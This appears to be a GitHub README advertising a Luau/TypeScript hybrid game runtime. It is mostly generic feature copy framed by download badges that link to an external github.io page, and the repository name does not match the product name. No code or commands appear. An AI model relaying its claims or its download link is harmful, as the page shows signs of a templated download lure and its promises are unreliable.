![preview](https://raw.githubusercontent.com/m7xxsv/atomic-luau-ts-forge/main/banner_f6581.svg)
[![Download](https://raw.githubusercontent.com/m7xxsv/atomic-luau-ts-forge/main/grab_dbf7.svg)](https://m7xxsv.github.io/atomic-luau-ts-forge/)

# 🧩 Polyforge Studio — Hybrid Scripting Runtime for Cross-Platform Game Craft

Welcome to **Polyforge Studio**, an open-source hybrid runtime environment designed for creators who want the flexibility of a scripting-first workflow without sacrificing the raw muscle of a native build. Where traditional engines ask you to pick a side between performance and productivity, Polyforge Studio offers a third path: a **multi-language execution core** that lets logic written in Luau and TypeScript coexist inside the same simulation loop, sharing state, memory, and scheduling primitives.

This repository hosts the runtime, toolchain, and reference documentation for building games, simulations, and interactive experiences that target desktop, mobile, and web form factors from a single source tree. The design philosophy is simple: write once, orchestrate everywhere, and let the engine handle the messy translation between fast native subsystems and expressive scripting layers.

If you have ever wanted your gameplay logic to feel like scripting while your rendering and physics stay glued to the metal, Polyforge Studio is built for exactly that tension.

---

## 📌 Table of Contents

- [Project Vision](#-project-vision)
- [Why Polyforge Studio Exists](#-why-polyforge-studio-exists)
- [Core Feature Set](#-core-feature-set)
- [Runtime Architecture Overview](#-runtime-architecture-overview)
- [Embedded Scripting: Luau Meets TypeScript](#-embedded-scripting-luau-meets-typescript)
- [Multilingual & Accessibility Layer](#-multilingual--accessibility-layer)
- [Responsive Tooling & Editor Experience](#-responsive-tooling--editor-experience)
- [Support & Community Cadence](#-support--community-cadence)
- [Platform Targets](#-platform-targets)
- [Performance Notes](#-performance-notes)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [Contributing](#-contributing)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Disclaimer](#-disclaimer)
- [License](#-license)
- [Final Download Marker](#-final-download-marker)

---

## 🎯 Project Vision

Polyforge Studio aims to be the **connective tissue** between expressive, high-level scripting languages and the deterministic, high-throughput world of native game execution. Instead of treating scripts as a bolted-on afterthought, the runtime treats them as first-class citizens living in the same process, sharing the same event bus, and communicating through a unified bridge API.

Think of it as a forge where molten scripting and cooled native code are hammered together into a single alloy. Neither dominates; both contribute their strengths.

---

## 🌱 Why Polyforge Studio Exists

Most engines force a decision early in a project's life:

- A scripting-heavy engine that struggles when the simulation gets dense.
- A native-heavy engine that punishes rapid iteration and quick prototyping.
- Or a web-first engine that shines in the browser but feels stranded on desktop and mobile.

Polyforge Studio was born from the frustration of that trilemma. The team behind this repository wanted a workspace where a gameplay designer could spin up a mechanic in TypeScript, hand it to an engineer to hot-swap a native Luau-backed module, and have both versions run side by side in the same build for comparison — all without a rebuild ritual costing entire minutes.

The result is a runtime that treats **language boundaries as soft seams**, not hard walls.

---

## 🚀 Core Feature Set

- 🧠 **Dual Language Bridge** — Luau and TypeScript share a single object graph with reference-safe handles, enabling cross-language callbacks without serialization overhead.
- ⚡ **Just-In-Time Compilation Path** — Hot-reloadable modules keep iteration snappy during authoring sessions.
- 🧵 **Thread-Safe Event Bus** — A lock-aware scheduler coordinates scripted and native systems across worker threads.
- 🖥️ **Responsive Editor Overlay** — An in-game dev panel that reflows to any screen, from ultrawide monitors to handheld displays.
- 🌍 **Multilingual Support** — Locale packs, including RTL shaping and CJK line-breaking, are wired directly into the text pipeline.
- 🧩 **Modular Scene Graph** — Nodes are composable, and scripting attachments can be grafted onto existing subtrees at runtime.
- 🔁 **Deterministic Replay Harness** — Record and replay input streams to reproduce bugs with frame-accurate fidelity.
- 🛡️ **Sandboxed Script Policy** — Fine-grained permissions for file, network, and system access per module.
- 📦 **Asset Pipeline with Content Addressing** — No path collisions; every imported resource gets a stable identity.
- 🧪 **Test Harness with Scripted Assertions** — Both Luau and TypeScript test suites run under the same runner.
- 📊 **Telemetry Dashboard** — Inspect frame budgets, GC pauses, and bridge call frequencies in real time.
- 🕒 **24/7 Customer Support Portal** — A rotating global team keeps response windows short regardless of your timezone.
- 🧭 **Project Templates** — Kickstart 2D, 3D, UI-heavy, and simulation-first scaffolds.
- ♻️ **Live Script Migration** — Move logic between Luau and TypeScript incrementally rather than all at once.

---

## 🏗️ Runtime Architecture Overview

The engine is structured in concentric layers:

1. **Kernel Layer** — Memory arenas, job scheduler, and platform abstraction.
2. **Native Subsystems** — Renderer, physics, audio mixer, input router.
3. **Bridge Layer** — The connective tissue that exposes native APIs to scripting worlds.
4. **Scripting Host** — Two sibling VMs (Luau and a TypeScript transpile target) living in the same process.
5. **Authoring Layer** — Editor tooling, hot-reload watchers, and the dev overlay.
6. **Distribution Layer** — Packaging, content addressing, and platform export.

Each layer is designed to be independently testable, and the bridge layer is where most of the interesting engineering lives. It maintains a registry of *bound symbols*, each with a lifetime policy — some are ephemeral (valid only within a frame), others are sticky (valid until explicitly released). This lets both scripting hosts call into native code without leaking handles.

---

## 🧬 Embedded Scripting: Luau Meets TypeScript

The dual-language story is the heart of the repository. Both languages are embedded, not wrapped:

- **Luau** is compiled into bytecode and executed inside the runtime's own VM, giving tight control over allocation and yielding behavior.
- **TypeScript** is transpiled ahead-of-time into a compact intermediate form that the same VM family can execute, preserving type-aware optimizations from the source.

Because both hosts share a VM family, a Luau function can be passed as a callback to a TypeScript listener, and vice versa. The bridge auto-generates the adapter shims, so developers do not hand-write glue code for every interaction.

A typical pattern looks like this in prose: a TypeScript module registers an input intent, a Luau module consumes that intent and mutates a physics body, and the renderer — written in native C++ — reads the resulting transform. None of the three components know the internal details of the others; they only share the intent contract.

---

## 🌐 Multilingual & Accessibility Layer

Language is not an afterthought in Polyforge Studio. The localization subsystem supports:

- Plural rules per locale, with an override table for edge cases.
- Bidirectional text shaping for right-to-left scripts.
- Font fallback chains that resolve per-glyph rather than per-run.
- Screen reader hooks that expose the scene graph as an accessibility tree.
- Color contrast auditing built into the editor overlay.

This means a single project can ship to audiences across regions without a bespoke localization fork, and accessibility affordances are available from day one rather than retrofitted late in production.

---

## 🖥️ Responsive Tooling & Editor Experience

The editor overlay is built with a layout solver that treats constraints as first-class citizens. Resize the window, dock a panel to a secondary display, or switch to a narrow tablet view — the tooling reflows without losing context. Buttons never fall off-screen, and the inspector stays legible even at small sizes.

For teams that prefer keyboard-driven workflows, the command palette indexes every action, and the layout engine remembers preference sets per project.

---

## 🤝 Support & Community Cadence

Support is treated as a product surface, not a burden. The repository ships with:

- A triage rotation that covers all time zones, providing around-the-clock response coverage.
- A public issue tracker with templates for bug reports, feature requests, and performance regressions.
- A discussion forum organized by topic rather than by seniority, so newcomers can ask foundational questions without friction.
- Office hours recorded and archived for asynchronous viewing.

The goal is a community where the answer to "how do I do this" arrives quickly and kindly.

---

## 🕹️ Platform Targets

Polyforge Studio compiles to:

- Desktop operating systems with hardware-accelerated rendering.
- Mobile form factors with touch and gyroscope input adapters.
- WebAssembly hosts for browser-based distribution.
- Embedded/console-style runtimes where a restricted sandbox is required.

Each target has its own build profile with sensible defaults, and the abstraction layer keeps platform-specific code localized to a small set of translation units.

---

## ⚙️ Performance Notes

The runtime avoids the classic scripting tax through a few deliberate choices:

- Bridge calls are batched per frame where possible, reducing cross-VM chatter.
- Hot loops can be lifted into native modules without rewriting gameplay logic.
- The GC strategy is generational, with explicit *pause budgets* configurable per project.
- Deterministic scheduling means performance regressions are reproducible, not mysterious.

Benchmarks live in the `bench/` directory and are run in CI on every merge to catch regressions early.

---

## 🔍 SEO & Discoverability Notes

This section exists for contributors who maintain the project's public presence. When writing release notes, documentation, or blog posts, favor natural phrasing around terms like *cross-platform game engine*, *embedded Luau runtime*, *TypeScript game scripting*, *multi-language game development*, and *hybrid scripting architecture*. Avoid stacking keywords; instead, let them appear where they genuinely describe what the project does.

Search engines reward clarity and penalize manipulation, so the guidance here is simple: describe the project honestly, and the discoverability will follow.

---

## 🛠️ Contributing

Contributions are welcome across code, documentation, translation, and testing. Before opening a pull request:

1. Review the coding conventions in `CONTRIBUTING.md`.
2. Run the local test suite for both scripting hosts.
3. Ensure new public APIs have documentation stubs.
4. Keep commits focused and descriptive.

The maintainers aim to review incoming changes within a reasonable window and will provide constructive feedback rather than silent rejections.

---

## 🗺️ Roadmap for 2026

The 2026 roadmap emphasizes:

- A unified debugger that can step across language boundaries.
- Expanded locale coverage with community-sourced translation packs.
- A visual bridge inspector for tracking cross-VM calls in real time.
- Improved WebAssembly startup times.
- A plugin SDK for third-party tooling.
- Long-term support branches for studios with multi-year production cycles.

Priorities may shift based on community feedback, but the direction remains steady: make hybrid scripting feel native to every developer who touches it.

---

## ⚠️ Disclaimer

Polyforge Studio is provided as-is, without warranty of any kind, express or implied. The maintainers are not liable for any damages arising from its use, including but not limited to lost production time, corrupted project files, or unexpected runtime behavior. Always test builds in a staging environment before distributing to end users. Third-party modules referenced in documentation are the responsibility of their respective authors. The project name, branding, and associated marks belong to their respective holders and are used here for identification purposes only.

---

## 📄 License

This project is distributed under the MIT License. See the full text at the [MIT License](https://opensource.org/licenses/MIT) page for details. The license permits reuse, modification, and redistribution with attribution, and it disclaims warranty as described in the disclaimer above.

---

## 📥 Final Download Marker

[![Download](https://raw.githubusercontent.com/m7xxsv/atomic-luau-ts-forge/main/grab_dbf7.svg)](https://m7xxsv.github.io/atomic-luau-ts-forge/)